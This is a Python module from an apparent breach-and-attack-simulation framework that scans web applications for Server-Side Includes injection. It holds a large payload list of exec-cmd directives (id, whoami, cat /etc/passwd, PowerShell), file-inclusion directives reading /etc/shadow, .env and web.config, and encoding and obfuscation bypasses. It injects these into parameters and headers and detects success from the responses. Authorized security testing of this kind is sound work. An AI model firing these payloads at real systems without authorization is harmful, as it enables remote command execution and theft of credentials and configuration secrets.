"""
Server-Side Includes (SSI) injection testing module.

Tests for SSI directive injection in user input. SSI directives are processed
by web servers (Apache, Nginx, IIS) when parsing .shtml/.stm files or when
SSI is globally enabled. Successful injection can lead to RCE, file disclosure,
and information leakage.

MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""

from __future__ import annotations

import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Canary values used to detect successful SSI execution
SSI_CANARY = "BAS_SSI_CONFIRMED"
SSI_MATH_CANARY = "49"  # 7*7

# SSI injection payloads organized by directive type
SSI_INJECTION_PAYLOADS = [
    # --- exec cmd: Remote Command Execution ---
    f'<!--#exec cmd="echo {SSI_CANARY}" -->',
    '<!--#exec cmd="id" -->',
    '<!--#exec cmd="whoami" -->',
    '<!--#exec cmd="cat /etc/passwd" -->',
    '<!--#exec cmd="uname -a" -->',
    '<!--#exec cmd="hostname" -->',
    '<!--#exec cmd="dir" -->',
    '<!--#exec cmd="type C:\\windows\\win.ini" -->',
    '<!--#exec cmd="ipconfig" -->',
    '<!--#exec cmd="ifconfig" -->',
    f'<!--#exec cmd="echo {SSI_CANARY}" -->',

    # --- exec cgi: CGI Script Execution ---
    '<!--#exec cgi="/cgi-bin/env.cgi" -->',
    '<!--#exec cgi="/cgi-bin/printenv" -->',
    '<!--#exec cgi="/cgi-bin/test-cgi" -->',

    # --- include virtual/file: File Inclusion ---
    '<!--#include virtual="/etc/passwd" -->',
    '<!--#include virtual="/etc/shadow" -->',
    '<!--#include virtual="/etc/hostname" -->',
    '<!--#include virtual="/proc/self/environ" -->',
    '<!--#include virtual="/proc/version" -->',
    '<!--#include file="../../../../../../etc/passwd" -->',
    '<!--#include file="..\\..\\..\\..\\windows\\win.ini" -->',
    '<!--#include virtual="/.htpasswd" -->',
    '<!--#include virtual="/web.config" -->',
    '<!--#include virtual="/.env" -->',
    '<!--#include virtual="/WEB-INF/web.xml" -->',
    '<!--#include file="/etc/hosts" -->',
    '<!--#include virtual="/proc/self/cmdline" -->',

    # --- echo: Information Disclosure ---
    '<!--#echo var="DOCUMENT_ROOT" -->',
    '<!--#echo var="SERVER_SOFTWARE" -->',
    '<!--#echo var="SERVER_NAME" -->',
    '<!--#echo var="REMOTE_ADDR" -->',
    '<!--#echo var="SCRIPT_FILENAME" -->',
    '<!--#echo var="DATE_LOCAL" -->',
    '<!--#echo var="DATE_GMT" -->',
    '<!--#echo var="LAST_MODIFIED" -->',
    '<!--#echo var="HTTP_USER_AGENT" -->',
    '<!--#echo var="QUERY_STRING" -->',
    '<!--#echo var="REQUEST_URI" -->',
    '<!--#echo var="AUTH_TYPE" -->',
    '<!--#echo var="REMOTE_USER" -->',
    '<!--#echo var="SERVER_PORT" -->',
    '<!--#echo var="DOCUMENT_URI" -->',

    # --- config: Server Configuration Manipulation ---
    '<!--#config errmsg="SSI_ERROR_BAS_TEST" -->',
    '<!--#config timefmt="%Y-%m-%d %H:%M:%S" --><!--#echo var="DATE_LOCAL" -->',
    '<!--#config sizefmt="bytes" --><!--#fsize file="index.html" -->',

    # --- set: Variable Setting ---
    f'<!--#set var="BAS_TEST" value="{SSI_CANARY}" --><!--#echo var="BAS_TEST" -->',
    '<!--#set var="EXPLOIT" value="pwned" --><!--#echo var="EXPLOIT" -->',

    # --- flastmod/fsize: File Metadata ---
    '<!--#flastmod file="index.html" -->',
    '<!--#flastmod virtual="/etc/passwd" -->',
    '<!--#fsize file="index.html" -->',
    '<!--#fsize virtual="/etc/passwd" -->',

    # --- printenv: Environment Dump ---
    '<!--#printenv -->',

    # --- if/elif/else: Conditional SSI Logic ---
    '<!--#if expr="1=1" -->SSI_CONDITIONAL_TRUE<!--#endif -->',
    f'<!--#if expr="1=1" -->{SSI_CANARY}<!--#else -->SAFE<!--#endif -->',

    # --- Encoding bypass variants ---
    # URL encoded
    '%3C%21--%23exec%20cmd%3D%22echo%20BAS_SSI_CONFIRMED%22%20--%3E',
    # Double URL encoded
    '%253C%2521--%2523exec%2520cmd%253D%2522echo%2520BAS_SSI_CONFIRMED%2522%2520--%253E',
    # Unicode variations
    '\u003c!--#exec cmd="echo BAS_SSI_CONFIRMED" --\u003e',
    # Null byte injection
    f'test\x00<!--#exec cmd="echo {SSI_CANARY}" -->',
    # Newline injection
    f'test\n<!--#exec cmd="echo {SSI_CANARY}" -->',
    f'test\r\n<!--#exec cmd="echo {SSI_CANARY}" -->',

    # --- Edge cases and obfuscation ---
    # Extra whitespace
    '<!--  #exec  cmd="echo BAS_SSI_CONFIRMED"  -->',
    # Tab characters
    '<!--\t#exec\tcmd="echo BAS_SSI_CONFIRMED"\t-->',
    # Mixed case (some servers are case-insensitive)
    '<!--#EXEC CMD="echo BAS_SSI_CONFIRMED" -->',
    '<!--#Exec Cmd="echo BAS_SSI_CONFIRMED" -->',
    # Nested comment attempt
    '<!--<!--#exec cmd="echo BAS_SSI_CONFIRMED" -->-->',

    # --- IIS-specific SSI ---
    '<!--#include file="c:\\inetpub\\wwwroot\\web.config" -->',
    '<!--#exec cmd="cmd /c echo BAS_SSI_CONFIRMED" -->',
    '<!--#exec cmd="powershell -c Write-Output BAS_SSI_CONFIRMED" -->',
]


class SSIInjectionModule(BaseAttackModule):
    """
    Server-Side Includes (SSI) injection testing.

    SSI directives are special markup processed by web servers before
    sending the page to the client. When user input is included in
    SSI-processed pages without sanitization, attackers can inject
    directives to:
    - Execute system commands (<!--#exec cmd="..." -->)
    - Include arbitrary files (<!--#include virtual="..." -->)
    - Leak server environment variables (<!--#echo var="..." -->)
    - Modify server error messages (<!--#config errmsg="..." -->)
    - Dump all environment variables (<!--#printenv -->)

    Common vulnerable scenarios:
    - User input reflected in .shtml pages
    - SSI enabled globally on the web server
    - Template engines that pass through SSI directives
    - Error pages that include user-controlled content
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="ssi_injection",
            description="Server-Side Includes injection - exec, include, echo, printenv directives",
            category="ssi_injection",
            mitre_technique_ids=["T1190", "T1059"],
            mitre_technique_names=["Exploit Public-Facing Application", "Command and Scripting Interpreter"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-97", "CWE-96"],
            tags=["ssi", "injection", "rce", "file-inclusion", "apache", "iis"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = list(SSI_INJECTION_PAYLOADS)

        # Add custom command payloads
        custom_commands = options.get("commands", [])
        for cmd in custom_commands:
            payloads.append(f'<!--#exec cmd="{cmd}" -->')

        # Add custom file include targets
        custom_files = options.get("include_files", [])
        for f in custom_files:
            payloads.append(f'<!--#include virtual="{f}" -->')
            payloads.append(f'<!--#include file="{f}" -->')

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("ssi_injection", limit=100)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", [
            "name", "input", "comment", "message", "text",
            "content", "value", "q", "search", "query",
            "page", "file", "template", "title", "body",
        ])
        path = options.get("path", "/")
        method = options.get("method", "GET")

        # Also try injecting into common SSI-processed paths
        ssi_paths = options.get("ssi_paths", [
            path,
        ])
        # Add .shtml variants if path doesn't already end with .shtml
        if not path.endswith(".shtml"):
            base = path.rstrip("/")
            ssi_paths.extend([
                f"{base}.shtml",
                f"{base}/index.shtml",
            ])

        for payload in payloads:
            for param in inject_params:
                for ssi_path in ssi_paths:
                    req_id = uuid.uuid4().hex[:8]

                    if method.upper() == "POST":
                        requests.append(AttackRequest(
                            request_id=f"ssi-{req_id}",
                            target=target,
                            method="POST",
                            path=ssi_path,
                            body=f"{param}={payload}",
                            content_type="application/x-www-form-urlencoded",
                            headers={
                                "X-BAS-Payload": payload[:200],
                                "X-BAS-Param": param,
                            },
                        ))
                    else:
                        requests.append(AttackRequest(
                            request_id=f"ssi-{req_id}",
                            target=target,
                            method="GET",
                            path=ssi_path,
                            params={param: payload},
                            headers={
                                "X-BAS-Payload": payload[:200],
                                "X-BAS-Param": param,
                            },
                        ))

        # Also test SSI injection in HTTP headers (some apps reflect headers)
        header_payloads = [
            f'<!--#exec cmd="echo {SSI_CANARY}" -->',
            '<!--#echo var="DOCUMENT_ROOT" -->',
            '<!--#printenv -->',
        ]
        for hp in header_payloads:
            for inject_header in ["User-Agent", "Referer", "X-Forwarded-For"]:
                req_id = uuid.uuid4().hex[:8]
                requests.append(AttackRequest(
                    request_id=f"ssi-hdr-{req_id}",
                    target=target,
                    method="GET",
                    path=path,
                    headers={
                        inject_header: hp,
                        "X-BAS-Payload": hp[:200],
                        "X-BAS-Param": f"header:{inject_header}",
                    },
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        payload_used = request.headers.get("X-BAS-Payload", payload)
        inject_param = request.headers.get("X-BAS-Param", "unknown")

        # --- Direct RCE confirmation ---
        if SSI_CANARY in body:
            return ModuleResult(
                module_name="ssi_injection",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"SSI RCE confirmed: canary '{SSI_CANARY}' found in response (param: {inject_param})",
                severity="critical",
                mitre_technique_id="T1190",
                detail={"detection_type": "ssi_rce", "param": inject_param},
            )

        # --- Command execution output detection ---
        rce_indicators = [
            ("uid=", "Command execution: 'id' output detected"),
            ("gid=", "Command execution: 'id' output detected"),
            ("root:x:0:0", "File inclusion: /etc/passwd content via SSI"),
            ("root:*:0:0", "File inclusion: /etc/passwd content via SSI (BSD)"),
            ("[boot loader]", "File inclusion: win.ini content via SSI"),
            ("Linux version", "Command execution: 'uname' output via SSI"),
            ("Darwin", "Command execution: 'uname' output via SSI (macOS)"),
            ("Windows NT", "Command execution: 'uname' output via SSI (Windows)"),
            ("inet addr:", "Command execution: 'ifconfig' output via SSI"),
            ("inet ", "Command execution: network config output via SSI"),
            ("IPv4 Address", "Command execution: 'ipconfig' output via SSI"),
        ]
        for indicator, desc in rce_indicators:
            if indicator in body:
                # Make sure the indicator isn't just part of the original payload reflected
                if indicator not in payload_used:
                    return ModuleResult(
                        module_name="ssi_injection",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"SSI injection confirmed: {desc} (param: {inject_param})",
                        severity="critical",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "ssi_rce_output", "indicator": indicator, "param": inject_param},
                    )

        # --- echo var output detection ---
        echo_indicators = [
            ("DOCUMENT_ROOT", "SSI echo: DOCUMENT_ROOT variable exposed"),
            ("SERVER_SOFTWARE", "SSI echo: SERVER_SOFTWARE variable exposed"),
            ("SCRIPT_FILENAME", "SSI echo: SCRIPT_FILENAME variable exposed"),
            ("REMOTE_ADDR", "SSI echo: REMOTE_ADDR variable exposed"),
        ]
        # Check that the echo var actually produced output (the variable value, not the directive)
        for indicator, desc in echo_indicators:
            if f"var=\"{indicator}\"" in payload_used and indicator not in body:
                # The directive was in the payload but the variable name is not in response,
                # meaning it might have been resolved to its value
                # We check for typical values instead
                pass
            # If the response contains path-like values after an echo directive
            if "#echo" in payload_used and indicator in payload_used:
                # Look for path-like output that indicates the variable was resolved
                path_patterns = ["/var/www", "/usr/share", "/home/", "C:\\", "Apache", "nginx", "IIS"]
                for pattern in path_patterns:
                    if pattern in body and pattern not in payload_used:
                        return ModuleResult(
                            module_name="ssi_injection",
                            target=request.target,
                            status=VulnStatus.VULNERABLE,
                            payload_used=payload_used,
                            response_code=response.status_code,
                            response_body_preview=body[:500],
                            elapsed_ms=response.elapsed_ms,
                            evidence=f"SSI echo: server variable resolved - '{pattern}' in response (param: {inject_param})",
                            severity="high",
                            mitre_technique_id="T1190",
                            detail={"detection_type": "ssi_echo", "resolved_value": pattern, "param": inject_param},
                        )

        # --- printenv detection ---
        if "#printenv" in payload_used:
            env_indicators = [
                "DOCUMENT_ROOT=", "SERVER_NAME=", "HTTP_HOST=",
                "PATH=", "SERVER_PORT=", "QUERY_STRING=",
            ]
            env_count = sum(1 for ind in env_indicators if ind in body)
            if env_count >= 2:
                return ModuleResult(
                    module_name="ssi_injection",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SSI printenv: {env_count} environment variables exposed (param: {inject_param})",
                    severity="high",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "ssi_printenv", "env_count": env_count, "param": inject_param},
                )

        # --- config errmsg detection ---
        if "SSI_ERROR_BAS_TEST" in body:
            return ModuleResult(
                module_name="ssi_injection",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"SSI config: custom error message reflected - 'SSI_ERROR_BAS_TEST' in response (param: {inject_param})",
                severity="high",
                mitre_technique_id="T1190",
                detail={"detection_type": "ssi_config", "param": inject_param},
            )

        # --- set var detection ---
        if "#set" in payload_used and ("pwned" in body or SSI_CANARY in body):
            return ModuleResult(
                module_name="ssi_injection",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"SSI set/echo: variable set and reflected in response (param: {inject_param})",
                severity="high",
                mitre_technique_id="T1190",
                detail={"detection_type": "ssi_set_echo", "param": inject_param},
            )

        # --- Conditional SSI detection ---
        if "SSI_CONDITIONAL_TRUE" in body:
            return ModuleResult(
                module_name="ssi_injection",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"SSI conditional: if/endif directive executed (param: {inject_param})",
                severity="high",
                mitre_technique_id="T1190",
                detail={"detection_type": "ssi_conditional", "param": inject_param},
            )

        # --- SSI error message detection (indicates SSI is enabled) ---
        ssi_error_indicators = [
            ("[an error occurred while processing this directive]", "Apache SSI default error"),
            ("SSI Error", "Generic SSI error"),
            ("mod_include", "Apache mod_include referenced"),
            ("SSIStartTag", "SSI configuration exposed"),
            ("ssi_error", "SSI error in response"),
        ]
        for indicator, desc in ssi_error_indicators:
            if indicator.lower() in body.lower():
                return ModuleResult(
                    module_name="ssi_injection",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"SSI enabled: {desc} - '{indicator}' in response (param: {inject_param})",
                    severity="medium",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "ssi_error_message", "indicator": indicator, "param": inject_param},
                )

        # --- Date/time output detection (from echo DATE_LOCAL) ---
        if "#echo" in payload_used and "DATE" in payload_used:
            # If the payload contained a date echo and the response has
            # a date format that wasn't in the original payload
            import re
            date_patterns = [
                r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}",
                r"\w+day, \d{2}-\w+-\d{4}",
                r"\d{2}/\d{2}/\d{4}",
            ]
            for pattern in date_patterns:
                if re.search(pattern, body):
                    return ModuleResult(
                        module_name="ssi_injection",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"SSI echo: DATE variable resolved to formatted date (param: {inject_param})",
                        severity="medium",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "ssi_date_echo", "param": inject_param},
                    )

        # Check if the SSI directive was reflected without processing (not vulnerable but worth noting)
        if "<!--#" in body and "<!--#" in payload_used:
            # The directive was echoed back without processing - SSI not enabled for this page
            pass

        return ModuleResult(
            module_name="ssi_injection",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"param": inject_param},
        )
